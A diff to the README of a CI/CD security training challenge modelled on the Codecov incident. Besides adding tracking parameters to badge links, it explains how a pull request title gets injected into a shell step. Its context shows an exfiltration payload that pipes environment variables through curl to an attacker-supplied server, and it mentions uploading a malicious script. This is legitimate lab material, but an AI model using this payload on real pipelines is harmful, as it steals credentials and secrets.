@@ -1,6 +1,6 @@
-[![CICD-SEC-8 Ungoverned Usage of 3rd Party Services](https://img.shields.io/badge/CICD--SEC--8-Ungoverned%20Usage%20of%203rd%20Party%20Services-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/ungoverned-usage-of-3rd-party-services/)
+[![CICD-SEC-8 Ungoverned Usage of 3rd Party Services](https://img.shields.io/badge/CICD--SEC--8-Ungoverned%20Usage%20of%203rd%20Party%20Services-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/ungoverned-usage-of-3rd-party-services/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)
 
-[![CICD-SEC-9 Improper Artifact Integrity Validation](https://img.shields.io/badge/CICD--SEC--9-Improper%20Artifact%20Integrity%20Validation-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/improper-artifact-integrity-validation/)
+[![CICD-SEC-9 Improper Artifact Integrity Validation](https://img.shields.io/badge/CICD--SEC--9-Improper%20Artifact%20Integrity%20Validation-brightgreen)](https://www.cidersecurity.io/top-10-cicd-security-risks/improper-artifact-integrity-validation/?utm_source=github&utm_medium=github_page&utm_campaign=ci%2fcd%20goat_100422)
 
 This challenge draws inspiration from the [Codecov incident](https://about.codecov.io/security-update/), in which a 3rd party artifact included in the pipeline is hijacked.
 
@@ -18,7 +18,11 @@ In the challenge, Reportcov is a public repository of a 3rd party used by other 
     ```shell
     `env | curl -H "Content-Type: application/json" -X POST -d "$(</dev/stdin)" <YOUR SERVER>`
     ```
+    The injection is possible since the following line treats the title as a bash variable and as such it can evaluate command substitution inside.
+    
+    `sh "echo Pull Request ${title} created in the reportcov repository"`
 
+    GitHub published an [interesting article](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) about command injection in CI pipelines.
 
 3. Use the private key to upload a malicious _reportcov.sh_ script: 
 
